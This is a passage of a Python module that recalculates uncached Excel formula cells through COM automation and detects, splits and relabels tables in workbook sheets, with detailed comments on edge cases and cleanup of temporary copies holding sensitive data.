        wb_com.SaveAs(str(tmp_path), FileFormat=51)  # 51 = xlOpenXMLWorkbook (.xlsx)
    finally:
        # wb_com is guaranteed non-None here (the check above already raised
        # otherwise) -- guarded anyway so a future change to the try body can
        # never reintroduce the same "finally masks the real error" failure
        # this function exists to avoid.
        if wb_com is not None:
            wb_com.Close(SaveChanges=False)
    return tmp_path


def _mark_unresolved_formula_cells(wb, cells_by_sheet: dict[str, list[tuple[int, int]]]) -> None:
    """Overwrite every (row, col) cell in `wb` listed in cells_by_sheet with
    UNRESOLVED_FORMULA_MARKER, styled to stand out (bold red text on a
    light-yellow fill) -- called by _fill_blank_formula_values for whichever
    formula-cell blanks it could never determine a real value for (no
    pywin32, Excel automation failed outright, or the recalculated copy came
    back missing that sheet). See UNRESOLVED_FORMULA_MARKER's own comment for
    why leaving these cells silently blank is worse than this."""
    marker_font = Font(bold=True, color="CC0000")
    marker_fill = PatternFill(start_color="FFF2CC", end_color="FFF2CC", fill_type="solid")
    for sheet_name, cells in cells_by_sheet.items():
        if sheet_name not in wb.sheetnames:
            continue
        ws = wb[sheet_name]
        for r, c in cells:
            cell = ws.cell(row=r, column=c, value=UNRESOLVED_FORMULA_MARKER)
            cell.font = marker_font
            cell.fill = marker_fill


def _fill_blank_formula_values(
    wb, path: Path, log_fn=print, temp_base_dir: Optional[Path] = None
) -> None:
    """Patch every formula cell in `wb` that came back None (see
    _blank_formula_cells) with its real computed value, via a disposable
    Excel-recalculated copy of `path` (see _recalc_via_excel) -- `path`
    itself is never modified (see the module-level note above). No-op if
    there's nothing to patch. temp_base_dir (see open_any_workbook) is where
    that disposable copy is created -- passed as tempfile.mkdtemp's own `dir`
    so it lands in a caller-controlled folder (e.g. triage_pipeline.py's
    output_folder) instead of the OS temp dir, which would otherwise hold a
    full copy of this workbook (real PII/PHI) outside any approved storage
    location until _cleanup_temp_dir below runs -- or indefinitely, if the
    process is killed first. Falls back to flagging the affected cells with
    UNRESOLVED_FORMULA_MARKER -- logging a warning rather than failing the
    whole file -- if pywin32 isn't installed, Excel automation errors out for
    any reason (e.g. Excel isn't installed on this machine, or the file is
    corrupt), or the recalculated copy comes back missing a sheet that had
    blanks. A cell whose real value genuinely comes back blank from a
    successful recalculation is left blank -- that's a real result, not an
    unresolved one; only cells this function never got to actually check are
    flagged.

    _blank_formula_cells itself is wrapped in its own try/except here (it
    used to run unguarded) -- it opens a SECOND copy of `path` internally,
    and if that raises (e.g. a corrupt file that the first, already-
    successful load happened to tolerate), letting the exception escape
    this function would propagate all the way out of open_any_workbook with
    `wb` -- the caller's already-open workbook, holding a zip handle and the
    whole document in memory -- never returned and never closed: process_file
    only ever binds its own `wb` name AFTER open_any_workbook returns, so its
    except block has no reference to close. Treating this the same as any
    other recalculation failure (log + leave the affected cells blank) keeps
    that failure mode non-fatal, same as every other case this function
    already falls back on, and guarantees `wb` always makes it back to the
    caller intact."""
    try:
        blanks = _blank_formula_cells(wb, path)
    except Exception as exc:
        log_fn(f"  WARNING: could not check '{path.name}' for blank (uncached) formula "
               f"values ({exc}) -- any formula cells with no cached value will be left "
               "blank in the output.")
        return
    if not blanks:
        return

    n_blank = sum(len(v) for v in blanks.values())
    if not HAS_WIN32COM:
        log_fn(f"  WARNING: '{path.name}' has {n_blank} formula cell(s) with no cached "
               "value, but pywin32 isn't installed to recalculate them -- install with: "
               f"pip install pywin32. Those cells are flagged '{UNRESOLVED_FORMULA_MARKER}' "
               "in the output instead of being left blank.")
        _mark_unresolved_formula_cells(wb, blanks)
        return

    # Tracks every (sheet, row, col) this function actually got a definitive
    # answer for -- patched with a real value OR confirmed genuinely blank by
    # a successful recalculation -- so that whatever's left over in `blanks`
    # afterward (a sheet missing from the recalculated copy, or the whole
    # attempt failing outright below) is exactly the set _mark_unresolved_
    # formula_cells should flag, and nothing more.
    resolved: dict[str, set[tuple[int, int]]] = {}

    tmp_dir = Path(tempfile.mkdtemp(prefix="excel_recalc_", dir=temp_base_dir))
    try:
        excel_app = _get_excel_app()
        recalced_path = _recalc_via_excel(path, excel_app, tmp_dir)
        wb_recalced = openpyxl.load_workbook(recalced_path, data_only=True)
        try:
            for sheet_name, cells in blanks.items():
                if sheet_name not in wb_recalced.sheetnames:
                    continue
                src_ws = wb_recalced[sheet_name]
                dest_ws = wb[sheet_name]
                for r, c in cells:
                    value = src_ws.cell(row=r, column=c).value
                    if value is not None:
                        dest_ws.cell(row=r, column=c).value = value
                    resolved.setdefault(sheet_name, set()).add((r, c))
        finally:
            wb_recalced.close()
    except Exception as exc:
        log_fn(f"  WARNING: Excel recalculation failed for '{path.name}' ({exc}) -- "
               f"formula cells with no cached value are flagged '{UNRESOLVED_FORMULA_MARKER}' "
               "in the output instead of being left blank.")
    finally:
        # tmp_dir held a full recalculated copy of `path` (real PII/PHI) --
        # verify the delete actually took rather than trusting
        # ignore_errors=True silently, since Excel may still hold a handle on
        # it right after the COM SaveAs above. Mirrors doc_reader_v2.py's own
        # _cleanup_images_dir (verify + warn instead of silent best-effort).
        shutil.rmtree(tmp_dir, ignore_errors=True)
        if tmp_dir.exists():
            log_fn(f"  WARNING: could not fully delete temp folder containing a recalculated "
                   f"copy of '{path.name}' (may still hold real data): {tmp_dir}")

    unresolved = {
        sheet_name: [pos for pos in cells if pos not in resolved.get(sheet_name, set())]
        for sheet_name, cells in blanks.items()
    }
    unresolved = {sheet_name: cells for sheet_name, cells in unresolved.items() if cells}
    if unresolved:
        _mark_unresolved_formula_cells(wb, unresolved)


# --------------------------------------------------------------------------
# Table detection — purely geometric (blank-row / blank-column occupancy),
# no assumptions about what the cells contain.
# --------------------------------------------------------------------------

def _empty(value) -> bool:
    if value is None:
        return True
    return str(value).strip() in ("", "-")


def _true_sheet_extent(ws) -> tuple[int, int]:
    """The real (max_row, max_col) of ws's actually-populated cells, 1-indexed
    -- (0, 0) if the sheet has no real data at all.

    ws.max_row/ws.max_column (openpyxl's own properties) reflect the highest
    row/column of ANY cell object openpyxl has ever instantiated for this
    sheet, whether or not that cell holds a value -- whole-row/whole-column
    formatting, a stray leftover style at the bottom of an old sheet, a
    cleared-but-not-deleted range, or even just READING a cell's .value via
    ws.cell(row, column) (a plain read still instantiates and caches a real
    Cell the first time -- _blank_formula_cells used to do exactly that on
    this same `wb` before detect_tables ever runs, until it was switched to
    a non-materializing ws._cells.get() read for the same reason this
    function already avoids ws.cell() entirely -- see
    _cell_value_without_materializing) -- can all push those properties out
    to Excel's absolute limits -- 1,048,576 rows x 16,384 columns -- for a
    sheet whose real data is a handful of rows. Passing that straight to
    _occupancy_grid's iter_rows() would generate on the order of 1.7e10 cells
    and retain roughly 1e6 sets for a 20-row sheet -- it doesn't raise an
    exception, it hangs and then exhausts memory, with process_file's broad
    exception handler giving no signal about which file did it.

    Scanning ws._cells directly and counting only a cell that isn't _empty()
    sidesteps all of that: a merely-instantiated-but-blank cell (from
    formatting, or from a stray ws.cell() read elsewhere) is excluded the
    same way regardless of why it was created.

    Falls back to ws.max_row/ws.max_column (still clamped by the caller
    against MAX_SHEET_ROWS/MAX_SHEET_COLS) if _cells isn't there to read --
    it's a private openpyxl implementation detail, not documented API, so a
    future openpyxl version that renames or removes it should degrade to the
    old (if potentially bloated) bounds rather than crash outright."""
    try:
        cells = ws._cells
    except AttributeError:
        return ws.max_row or 0, ws.max_column or 0

    max_row = max_col = 0
    for (r, c), cell in cells.items():
        if _empty(cell.value):
            continue
        if r > max_row:
            max_row = r
        if c > max_col:
            max_col = c
    return max_row, max_col


def _occupancy_grid(ws, max_row: int, max_col: int) -> list[set[int]]:
    """grid[i] = the 0-indexed columns occupied on row i+1 (1-indexed)."""
    grid: list[set[int]] = []
    for row in ws.iter_rows(min_row=1, max_row=max_row, max_col=max_col, values_only=True):
        grid.append({c for c, v in enumerate(row) if not _empty(v)})
    return grid


def _row_blocks(grid: list[set[int]]) -> list[tuple[int, int]]:
    """1-indexed inclusive (first_row, last_row) for every run of consecutive
    rows that isn't fully blank, i.e. the vertical (stacked) table split."""
    blocks: list[tuple[int, int]] = []
    start: Optional[int] = None
    for i, occ in enumerate(grid):
        r = i + 1
        if occ:
            if start is None:
                start = r
        elif start is not None:
            blocks.append((start, r - 1))
            start = None
    if start is not None:
        blocks.append((start, len(grid)))
    return blocks


def column_clusters(cols: set[int]) -> list[tuple[int, int]]:
    """Split a 0-indexed column set into contiguous (min, max) clusters — a
    gap of one or more missing columns separates clusters."""
    if not cols:
        return []
    ordered = sorted(cols)
    clusters: list[tuple[int, int]] = []
    start = prev = ordered[0]
    for c in ordered[1:]:
        if c == prev + 1:
            prev = c
        else:
            clusters.append((start, prev))
            start = prev = c
    clusters.append((start, prev))
    return clusters


def _cluster_cell_counts(
    grid: list[set[int]], r0: int, r1: int, clusters: list[tuple[int, int]]
) -> list[int]:
    """Occupied-cell count for EVERY cluster in `clusters`, in one pass over
    the row block -- each occupied column is bucketed into its cluster via
    bisect on the clusters' (sorted, non-overlapping) start columns, rather
    than detect_tables' own two call sites each looping `for c0, c1 in
    clusters: sum(... for i in range(r0-1, r1) for c in grid[i] if c0 <= c <=
    c1)` -- that re-scanned the WHOLE row block once per cluster, O(K x R x C)
    for K clusters, R rows, C average occupied columns per row, when a single
    pass bucketing each occupied column is O(R x C x log K). detect_tables
    calls this from a list comprehension over every cluster found on a row
    block (potentially many, on a heavily fragmented sheet, right up against
    the MAX_SHEET_ROWS/MAX_SHEET_COLS ceilings) -- this module's hottest
    loop, so the K factor matters.

    clusters must be sorted ascending and non-overlapping, which
    column_clusters (the only place they come from) already guarantees by
    construction -- built by splitting one sorted, deduplicated column set
    into contiguous runs."""
    counts = [0] * len(clusters)
    starts = [c0 for c0, _c1 in clusters]
    for i in range(r0 - 1, r1):
        for c in grid[i]:
            idx = bisect.bisect_right(starts, c) - 1
            if idx >= 0 and clusters[idx][0] <= c <= clusters[idx][1]:
                counts[idx] += 1
    return counts


def _is_real_table(region: tuple[int, int, int, int]) -> bool:
    """A genuine table needs at least MIN_TABLE_ROWS rows. This is what tells
    a real table apart from a small non-tabular fragment that just happens to
    sit in its own blank-row/blank-column-separated block (e.g. a lone date or
    label stamped above the real table, separated from it by one blank row,
    always exactly one row) -- geometrically that fragment forms its own
    "block" exactly like a real table does, but it isn't one. There is
    deliberately no column-count floor: a genuine single-column table (a
    plain list of names, IDs, etc., spanning many rows) must still count as a
    real table, and the fragment case above is always one row regardless of
    how many columns it happens to span, so the row floor alone already
    separates the two cases.

    Merged cells and images are not weighed here at all: a sheet containing
    either never reaches detect_tables in the first place -- see
    process_file's own per-sheet gate, which routes such a sheet straight to
    a "not parsed" Reviewer Note instead of attempting geometric table
    detection on it."""
    row_start, row_end, _col_start, _col_end = region
    return (row_end - row_start + 1) >= MIN_TABLE_ROWS


def _peel_leading_caption_rows(
    grid: list[set[int]], r0: int, r1: int, c0: int, c1: int
) -> tuple[int, list[tuple[int, int, int, int]]]:
    """Peel narrow leading rows off the top of a detected row block -- e.g. a
    title, company name, or "Period: ..." date stamp sitting directly above
    the block's real header/data with no blank row separating them, so
    _row_blocks can't split it out into its own block the way it does for a
    caption that DOES have a blank row under it (that case is already handled
    by the ordinary skipped-fragment path below). Without this, the block's
    own first row -- one of these caption lines -- gets fed straight into
    _table_has_header, which reads it as the header since it's all text, and
    the real header a few rows down ends up as ordinary data instead.

    A row counts as a caption line if it occupies fewer than half as many
    columns as the widest row anywhere in the block (the real header/data
    rows, which use most or all of the block's column span) -- peeling stops
    at the first row that isn't narrow, so it only ever strips leading lines,
    never rows in the middle of the real table. Returns (new_r0,
    peeled_fragments); peeled_fragments is empty when nothing was peeled, and
    is otherwise a list of single-row (row, row, col_start, col_end) regions
    -- 1-indexed, same shape as a skipped fragment -- meant to be matched to
    the table that ends up starting at new_r0 via _match_context_fragments,
    exactly like any other caption fragment."""
    # sum(1 for c in grid[i] if c0 <= c <= c1) instead of
    # len(grid[i] & set(range(c0, c1 + 1))): the latter allocates a fresh
    # range-set every row even though c0/c1 are loop-invariant, and this
    # function is called once per cluster per row block (see detect_tables'
    # own call sites) -- O(rows-in-block) occupied-column checks with no
    # allocation, versus O(rows-in-block x column-span) set construction.
    widths = [sum(1 for c in grid[i] if c0 <= c <= c1) for i in range(r0 - 1, r1)]
    max_width = max(widths)
    if max_width < _MIN_PEEL_WIDTH:
        return r0, []

    peeled: list[tuple[int, int, int, int]] = []
    idx = 0
    while idx < len(widths) - 1 and 0 < widths[idx] < max_width / 2:
        peeled.append((r0 + idx, r0 + idx, c0 + 1, c1 + 1))
        idx += 1
    return r0 + idx, peeled


def _merge_adjacent_same_column_tables(
    tables: list[tuple[int, int, int, int]]
) -> tuple[list[tuple[int, int, int, int]], dict[tuple[int, int, int, int], tuple[int, int, int, int]]]:
    """Merge consecutive tables (in row order) that share the exact same
    column range -- i.e. two chunks of what's really one logical table, split
    apart only because a blank spacer row sits between them (e.g. a section
    break in the middle of a list, or a genuine mid-table blank line) -- see
    the module docstring's note on this exact ambiguity. Only the first
    chunk's own first row is ever treated as this merged table's header
    (via _table_has_header downstream); every later chunk's own first row is
    just data, not a second header, since it's the same table continuing.

    Column range match is exact, not fuzzy -- two unrelated tables that
    happen to share a column span will still merge if they're adjacent with
    nothing but blank rows between them, same known ambiguity as above, but
    in practice a shared exact column span this close together is far more
    often a continuation than a coincidence.

    Returns (merged_tables, region_map): region_map maps every ORIGINAL
    region in `tables` to whatever region it ended up as after merging
    (itself, if it wasn't merged into anything). detect_tables' own
    external_headers dict is keyed by a table's PRE-merge region -- a fused
    header table's region can still get merged into an adjacent same-column
    chunk here, and without this map its external_headers entry would be
    silently orphaned (the key no longer matches anything in the merged
    `tables` list), and _rebuild_sheet would fall back to a synthetic
    "Column 1, Column 2, ..." header instead of the real recovered header
    text -- see detect_tables' own re-keying, right after this call."""
    if not tables:
        return tables, {}
    ordered = sorted(tables, key=lambda t: t[0])
    merged: list[tuple[int, int, int, int]] = [ordered[0]]
    region_map: dict[tuple[int, int, int, int], tuple[int, int, int, int]] = {ordered[0]: ordered[0]}
    for t in ordered[1:]:
        prev = merged[-1]
        if t[2] == prev[2] and t[3] == prev[3]:
            new_region = (prev[0], t[1], prev[2], prev[3])
            merged[-1] = new_region
            # Every original region already folded into `prev` (possibly
            # across more than one earlier merge in this same loop) needs to
            # be repointed at the new, wider region too -- not just `t` --
            # or an earlier chunk's own mapping would still resolve to a
            # region that no longer exists in `merged`.
            for orig, resolved in region_map.items():
                if resolved == prev:
                    region_map[orig] = new_region
            region_map[t] = new_region
        else:
            merged.append(t)
            region_map[t] = t
    return merged, region_map


def _build_header_dict(
    ws, header_r0: int, header_r1: int, col_start: int, col_end: int
) -> dict[int, str]:
    """Build {1-indexed column: combined header text} for columns col_start
    to col_end by reading ws rows header_r0..header_r1 top-to-bottom and
    joining every non-empty cell found in a given column with a space -- e.g.
    a "Social Security" / "Number" stack across two header rows in the same
    column becomes one "Social Security Number" header cell. A column with no
    value anywhere in the header rows is left out of the dict entirely (and
    ends up blank in the output header row) rather than forced to a
    placeholder -- an unlabeled column in the source (e.g. a plain running
    count with no header of its own) stays unlabeled in the output too,
    exactly matching what a reviewer would see in the original file.

    Used only by detect_tables' own header-fusion check (see
    MAX_HEADER_BLOCK_ROWS) to turn a small header block it's decided to
    consume into real per-column header text instead of a generic "column N"
    placeholder."""
    header: dict[int, str] = {}
    for col in range(col_start, col_end + 1):
        parts = []
        for row in range(header_r0, header_r1 + 1):
            value = ws.cell(row=row, column=col).value
            if not _empty(value):
                parts.append(str(value).strip())
        if parts:
            header[col] = " ".join(parts)
    return header


def detect_tables(
    ws, log_fn=print
) -> tuple[list[tuple[int, int, int, int]], list[tuple[int, int, int, int]],
           dict[tuple[int, int, int, int], dict[int, str]]]:
    """Returns (tables, skipped_fragments, external_headers):
      - tables/skipped_fragments -- both lists of (row_start, row_end,
        col_start, col_end), all 1-indexed inclusive. `tables` is every
        detected block that's big enough to count as a real table (see
        _is_real_table), after peeling any leading caption rows off each
        block (see _peel_leading_caption_rows) and merging adjacent
        same-column-range tables back together (see
        _merge_adjacent_same_column_tables); `skipped_fragments` is every
        detected block -- and every peeled caption row -- that was excluded
        for being too small (see MIN_TABLE_ROWS) -- kept separate, rather
        than silently dropped, so callers can report on them (see
        _write_skipped_fragments_sheet) or match them to a table as context
        (see _match_context_fragments).
      - external_headers -- {table region: {1-indexed column: header text}}
        for a table whose header came from the row-block immediately ABOVE
        it (see the header-fusion check below) rather than from its own
        first row -- callers write this in place of a native or synthetic
        header (see _rebuild_sheet).
    All three are empty if the sheet has no data at all -- also empty (with a
    logged warning) if the sheet's true extent (see _true_sheet_extent) still
    exceeds MAX_SHEET_ROWS/MAX_SHEET_COLS after that filtering, rather than
    risk hanging/exhausting memory building an occupancy grid at that scale.

    Header fusion -- the shape this exists for: a small (<= MAX_HEADER_
    BLOCK_ROWS) row-block sitting directly above another block, separated by
    exactly one blank row (i.e. two genuinely separate row-blocks, never a
    header glued to the top of its OWN block with no blank row between --
    that's _peel_leading_caption_rows' job, entirely separate from this),
    where the row-block BELOW would otherwise geometrically split into 2+
    side-by-side tables (a full blank column running through it) and the
    row-block ABOVE has at least one occupied column landing inside EVERY one
    of those splits. That combination is treated as a shared multi-row header
    bridging what would otherwise be reported as unrelated side-by-side
    tables: the header block's own rows are consumed entirely (added to
    neither `tables` nor `skipped` -- see _build_header_dict) and the block
    below becomes ONE table spanning the full bridged width instead of
    splitting. If the bridged region doesn't actually qualify as a real table
    (e.g. it's too short after peeling) the fusion attempt is abandoned and
    both blocks fall through to being processed normally instead -- the
    header block is never silently discarded just because the fusion that
    would have used it didn't pan out.

    Caption-block lookahead -- the OTHER shape a short block above another
    block can be: not a shared header for a side-by-side split (the row-block
    BELOW splits into only one cluster, not 2+), but a caption/banner too
    narrow to be that block's real content -- occupying fewer than half as
    many columns as the row-block below it. A too-small (1-row) fragment
    already gets this same "belongs to the next table" treatment via
    _is_real_table/_match_context_fragments, but a 2-or-more-row narrow block
    (e.g. two stacked single-column label lines) clears MIN_TABLE_ROWS on row
    count alone and would otherwise become a bogus table of its own. When the
    row-block below already qualifies as a real table by row count, this
    whole block is emitted into `skipped` instead -- one single-row fragment
    per row, same shape _peel_leading_caption_rows produces -- for
    _match_context_fragments to attach to that next table as context, rather
    than being added to `tables`."""
    max_row, max_col = _true_sheet_extent(ws)
    if max_row == 0 or max_col == 0:
        return [], [], {}

    if max_row > MAX_SHEET_ROWS or max_col > MAX_SHEET_COLS:
        log_fn(
            f"  WARNING: sheet '{ws.title}' has an unusually large populated extent "
            f"({max_row} rows x {max_col} columns, over the {MAX_SHEET_ROWS} x "
            f"{MAX_SHEET_COLS} sanity ceiling) -- skipping table detection on this sheet "
            "rather than risk hanging or exhausting memory building its occupancy grid."
        )
        return [], [], {}

    grid = _occupancy_grid(ws, max_row, max_col)
    tables: list[tuple[int, int, int, int]] = []
    skipped: list[tuple[int, int, int, int]] = []
    external_headers: dict[tuple[int, int, int, int], dict[int, str]] = {}

    def _add(region: tuple[int, int, int, int]) -> None:
        (tables if _is_real_table(region) else skipped).append(region)

    def _occupied_cols_of(r0: int, r1: int) -> set[int]:
        cols: set[int] = set()
        for i in range(r0 - 1, r1):
            cols |= grid[i]
        return cols

    blocks = _row_blocks(grid)
    idx = 0
    while idx < len(blocks):
        r0, r1 = blocks[idx]
        occupied_cols = _occupied_cols_of(r0, r1)
        if not occupied_cols:
            idx += 1
            continue

        # Header-fusion lookahead -- see this function's own docstring. Only
        # attempted when this block is short enough to be a plausible header
        # (MAX_HEADER_BLOCK_ROWS) and there IS a next block to fuse it with;
        # nothing is committed to `tables`/`skipped` until the fused region
        # is confirmed to actually qualify as a real table, so a failed
        # attempt falls through to ordinary per-block processing below with
        # no side effects.
        if idx + 1 < len(blocks) and (r1 - r0 + 1) <= MAX_HEADER_BLOCK_ROWS:
            next_r0, next_r1 = blocks[idx + 1]
            next_occupied_cols = _occupied_cols_of(next_r0, next_r1)
            next_clusters = column_clusters(next_occupied_cols)
            if len(next_clusters) > 1:
                next_counts = _cluster_cell_counts(grid, next_r0, next_r1, next_clusters)
                bridges_every_cluster = all(
                    any(c0 <= h <= c1 for h in occupied_cols) for c0, c1 in next_clusters
                )
                if bridges_every_cluster and all(cnt >= _MIN_CLUSTER_CELLS for cnt in next_counts):
                    bridge_c0, bridge_c1 = min(next_occupied_cols), max(next_occupied_cols)
                    fused_r0, peeled_candidate = _peel_leading_caption_rows(
                        grid, next_r0, next_r1, bridge_c0, bridge_c1
                    )
                    candidate_region = (fused_r0, next_r1, bridge_c0 + 1, bridge_c1 + 1)
                    if _is_real_table(candidate_region):
                        header_dict = _build_header_dict(
                            ws, r0, r1, bridge_c0 + 1, bridge_c1 + 1
                        )
                        if header_dict:
                            skipped.extend(peeled_candidate)
                            tables.append(candidate_region)
                            external_headers[candidate_region] = header_dict
                            idx += 2
                            continue
            elif (
                len(occupied_cols) * 2 < len(next_occupied_cols)
                and _is_real_table((next_r0, next_r1, 0, 0))
            ):
                # This whole block is a caption/banner sitting directly above
                # the next (real, and much wider) block -- e.g. two stacked
                # "CLIENT: ..." / "PLAN: ..." lines, each occupying only one
                # column, above a genuine multi-column table. Read in
                # isolation this block still clears MIN_TABLE_ROWS on row
                # count alone (unlike the single-row fragment case
                # _is_real_table's own docstring describes), so without this
                # check it would become its own bogus "table" instead of
                # ever reaching _match_context_fragments. Mirrors
                # _peel_leading_caption_rows' own "narrower than half the
                # block's real width" test, just applied across a whole
                # blank-row-separated block instead of within one -- same
                # known tradeoff: a genuine short, narrow single-column table
                # that happens to sit right above another real table is
                # indistinguishable from a caption by this purely geometric
                # rule and gets folded into the next table's context too.
                for r in range(r0, r1 + 1):
                    skipped.append((r, r, min(occupied_cols) + 1, max(occupied_cols) + 1))
                idx += 1
                continue

        clusters = column_clusters(occupied_cols)
        if len(clusters) > 1:
            counts = _cluster_cell_counts(grid, r0, r1, clusters)
            if all(cnt >= _MIN_CLUSTER_CELLS for cnt in counts):
                for c0, c1 in clusters:
                    new_r0, peeled = _peel_leading_caption_rows(grid, r0, r1, c0, c1)
                    skipped.extend(peeled)
                    _add((new_r0, r1, c0 + 1, c1 + 1))
                idx += 1
                continue
        c0, c1 = min(occupied_cols), max(occupied_cols)
        new_r0, peeled = _peel_leading_caption_rows(grid, r0, r1, c0, c1)
        skipped.extend(peeled)
        _add((new_r0, r1, c0 + 1, c1 + 1))
        idx += 1

    tables, region_map = _merge_adjacent_same_column_tables(tables)
    if external_headers:
        # Re-key by the map above -- a fused-header table's region (the key
        # external_headers was populated with, above) can itself get merged
        # into an adjacent same-column chunk by the call just now, and
        # without this its entry would point at a region that no longer
        # exists in `tables` (see _merge_adjacent_same_column_tables' own
        # docstring).
        external_headers = {
            region_map.get(region, region): header_dict
            for region, header_dict in external_headers.items()
        }
    return tables, skipped, external_headers


def _match_context_fragments(
    tables: list[tuple[int, int, int, int]],
    skipped: list[tuple[int, int, int, int]],
) -> tuple[dict[tuple[int, int, int, int], list[tuple[int, int, int, int]]], list[tuple[int, int, int, int]]]:
    """Match each skipped (too-small) fragment to the nearest table that
    starts on a LATER row in the same sheet -- e.g. a title/caption or a lone
    date stamp sitting just above its table, blank-row-separated. Returns
    (context_by_table, unmatched):

    - context_by_table maps a table's own region to the ordered (top-to-
      bottom) list of fragment regions attached to it as context -- there can
      be more than one (e.g. a date stamp AND a title, each its own
      blank-row-separated block, both above the same table).
    - unmatched is every fragment with no table anywhere later in the sheet
      to attach to (e.g. a trailing footnote after the last table) -- those
      still get reported on the Reviewer Note sheet, same as before this
      matching existed.

    A fragment is never matched "sideways" to a table on the same rows (e.g.
    a stray side note) -- see the module docstring's note on those already
    being folded into the table region itself by detect_tables, rather than
    forming their own skipped block, whenever that happens.

    A fragment can also end up INSIDE a table's row range rather than before
    it: _merge_adjacent_same_column_tables joins two blank-row-separated
    chunks of the same logical table into one region spanning both, and if
    the second chunk had its own leading rows peeled as a caption (see
    _peel_leading_caption_rows), that peeled fragment's row now falls between
    the merged table's start and end, not before it -- _copy_region has
    already copied that row into the table as ordinary data by the time this
    runs. Left to the "starts on a later row" rule alone, such a fragment
    would match no table at all (the one it actually belongs to starts
    BEFORE it, not after) and get reported as an orphaned, unmatched
    fragment while the table it was peeled from gets no context note --
    doubly wrong, since its content is now ALSO sitting in the table as a
    data row. Checked for and attached to that table as context instead,
    before falling through to the ordinary later-table search.

    Matching itself is O(log T) per fragment (T = table count) via
    bisect_right into start_rows below, rather than the O(T) linear
    `next(t for t in sorted_tables if t[0] > frag_row_end)` scan a previous
    version did for every single fragment -- both sorted_tables and
    start_rows are already sorted by row, so a full O(F x T) rescan from the
    start of the table list for each of F fragments was pure waste; on a
    dense sheet with many captions above many tables this was the module's
    hottest loop."""
    if not skipped or not tables:
        return {}, list(skipped)

    sorted_tables = sorted(tables, key=lambda r: r[0])
    start_rows = [t[0] for t in sorted_tables]
    context_by_table: dict[tuple[int, int, int, int], list[tuple[int, int, int, int]]] = {}
    unmatched: list[tuple[int, int, int, int]] = []

    for frag in skipped:
        frag_row_start, frag_row_end, frag_col_start, frag_col_end = frag
        idx = bisect.bisect_right(start_rows, frag_row_end)

        # _merge_adjacent_same_column_tables can produce a table that spans
        # right over a fragment peeled from a later chunk's own leading rows
        # (see detect_tables/_peel_leading_caption_rows) -- that fragment's
        # row range then sits INSIDE the table immediately before `idx` in
        # start-row order, not strictly after it, so the ordinary
        # "first table starting later" lookup below would never find it (and
        # that row is already physically copied into the table as an
        # ordinary data row by _copy_region). Checked first, against only
        # sorted_tables[idx - 1] -- the sole table whose start row could
        # possibly be <= frag_row_end and still end at/after it, since tables
        # are otherwise row-disjoint -- and only on an exact column-range
        # match (the same c0+1/c1+1 the fragment and its would-be table were
        # both built from), so this never reattaches a fragment that merely
        # sits row-adjacent to a column-disjoint side-by-side table.
        if idx > 0:
            prev_table = sorted_tables[idx - 1]
            if (
                prev_table[2] == frag_col_start and prev_table[3] == frag_col_end
                and prev_table[0] <= frag_row_start and frag_row_end <= prev_table[1]
            ):
                context_by_table.setdefault(prev_table, []).append(frag)
                continue

        if idx >= len(sorted_tables):
            unmatched.append(frag)
            continue
        target = sorted_tables[idx]
        context_by_table.setdefault(target, []).append(frag)

    for frags in context_by_table.values():
        frags.sort(key=lambda r: r[0])

    return context_by_table, unmatched


def _fragment_preview(ws, region: tuple[int, int, int, int], max_len: int | None = 60) -> str:
    """Text preview of a fragment's content -- must be read from `ws` at
    detection time, before rebuild_workbook can replace or remove that sheet.

    max_len=60 (the default) is for the "Reviewer Note" sheet's "Sample
    Content" column, a summary listing where a short preview is the point.
    Pass max_len=None (see the context_by_table caller in process_file) when
    the full text is going into a table's own "Additional context" B1 cell
    instead -- that's the reviewer's only view of this content, so it must
    never be cut off with a trailing "..."; _write_additional_context_note
    wraps it to fit the cell instead."""
    row_start, row_end, col_start, col_end = region
    values = []
    for r in range(row_start, row_end + 1):
        for c in range(col_start, col_end + 1):
            v = ws.cell(row=r, column=c).value
            if v is not None and str(v).strip():
                values.append(str(v).strip())
    preview = "; ".join(values)
    if max_len is not None and len(preview) > max_len:
        preview = preview[:max_len] + "..."
    return preview


# --------------------------------------------------------------------------
# Sheet splitting
# --------------------------------------------------------------------------

_INVALID_SHEET_CHARS = re.compile(r"[:\\/?*\[\]]")


def _unique_sheet_name(existing: set[str], desired: str) -> str:
    """Resolve `desired` to a sheet name not already in `existing`, auto-
    renaming with a " (2)", " (3)", ... suffix same as elsewhere in this
    module -- and add the chosen name to `existing` before returning it, so
    the NEXT call in the same rebuild sees it as taken too.

    `existing` is a single set built ONCE by the caller (see
    rebuild_workbook) and threaded through every call for one workbook
    rebuild, rather than each call rebuilding set(wb.sheetnames) itself --
    this is called once per detected table across every sheet, and
    wb.sheetnames is itself O(sheet count), so re-deriving that set fresh on
    every call made a full rebuild O(N^2) in the total number of tables. A
    persistent set does mean this function no longer directly reflects
    wb.sheetnames as sheets are created elsewhere -- harmless here since
    every name this function ever produces is immediately used to create
    exactly one new sheet, and openpyxl's own create_sheet independently
    de-dupes an accidental collision anyway (confirmed: create_sheet("Dup")
    twice yields "Dup" and "Dup1"), so this is strictly a naming-quality
    convention (its own clean " (2)" numbering), not the only thing standing
    between here and a real duplicate title."""
    base = _INVALID_SHEET_CHARS.sub(" ", desired).strip() or "Sheet"
    base = base[:31]
    name = base
    n = 2
    while name in existing:
        suffix = f" ({n})"
        name = base[: 31 - len(suffix)] + suffix
        n += 1
    existing.add(name)
    return name


def _copy_region(src_ws, dest_ws, row_start: int, row_end: int,
                 col_start: int, col_end: int, row_offset: int = 0) -> None:
    """Copy one detected table's cell region from src_ws into dest_ws,
    reanchored at dest_ws row (1 + row_offset)/column 1. row_offset reserves
    that many rows at the top of dest_ws -- 1 for the "Detected via" note
    _write_detected_via_note adds afterward, plus 1 more (2 total) when the
    table has no header row of its own and _write_synthetic_header fills row
    2 instead -- so the copied table's own first row never collides with
    either."""
    for r in range(row_start, row_end + 1):
        for c in range(col_start, col_end + 1):
            src_cell = src_ws.cell(row=r, column=c)
            if src_cell.value is None and not src_cell.has_style:
                continue
            dest_cell = dest_ws.cell(row=r - row_start + 1 + row_offset, column=c - col_start + 1)
            dest_cell.value = _sanitize_cell_value(src_cell.value)
            if src_cell.has_style:
                dest_cell.font = copy(src_cell.font)
                dest_cell.border = copy(src_cell.border)
                dest_cell.fill = copy(src_cell.fill)
                dest_cell.number_format = src_cell.number_format
                dest_cell.alignment = copy(src_cell.alignment)
                dest_cell.protection = copy(src_cell.protection)

    for merged_range in src_ws.merged_cells.ranges:
        if (merged_range.min_row >= row_start and merged_range.max_row <= row_end
                and merged_range.min_col >= col_start and merged_range.max_col <= col_end):
            dest_ws.merge_cells(
